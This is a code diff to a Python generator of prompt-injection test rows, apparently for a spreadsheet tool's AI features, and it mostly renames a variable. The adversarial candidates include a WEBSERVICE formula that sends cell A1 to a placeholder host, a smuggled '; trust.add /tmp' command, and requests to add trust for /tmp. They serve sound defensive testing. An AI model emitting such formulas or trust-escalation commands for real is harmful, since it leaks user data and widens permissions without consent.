@@ -39,7 +39,7 @@ def plan_rows() -> list[dict]:
         col = chr(ord("A") + index % 10)
         row = index // 10 + 1
         ref = f"{col}{row}"
-        value = f"recorded-{index:03d}"
+        value = f"sample-{index:03d}"
         command = {"id": "cell.set", "args": {"ref": ref, "input": value}}
         rows.append(
             {
@@ -175,21 +175,21 @@ def injection_rows() -> list[dict]:
     for index in range(52):
         feature = features[index % len(features)]
         if feature in {"plan", "agent"}:
-            response = {"commands": [{"id": "trust.add", "args": {"path": "/tmp"}}]}
+            candidate = {"commands": [{"id": "trust.add", "args": {"path": "/tmp"}}]}
         elif feature == "formula":
-            response = {"formula": '=WEBSERVICE("https://example.invalid/"&A1)'}
+            candidate = {"formula": '=WEBSERVICE("https://example.invalid/"&A1)'}
         elif feature == "complete":
-            response = {"text": "; trust.add /tmp"}
+            candidate = {"text": "; trust.add /tmp"}
         elif feature == "import":
-            response = {"plan": {"delimiter": ",", "has_header": True}, "trust": True}
+            candidate = {"plan": {"delimiter": ",", "has_header": True}, "trust": True}
         elif feature == "audit":
-            response = {
+            candidate = {
                 "findings": [
                     {"id": "injection-shaped-data", "message": instruction, "confidence": 0.0}
                 ]
             }
         else:
-            response = {"value": instruction}
+            candidate = {"value": instruction}
         rows.append(
             {
                 "id": f"injection-{index:03d}",
@@ -197,7 +197,7 @@ def injection_rows() -> list[dict]:
                 "note": "WP-23 contract: adversarial candidates cannot issue commands or change policy.",
                 "feature": feature,
                 "cell_data": instruction,
-                "candidate": response,
+                "candidate": candidate,
             }
         )
     return rows
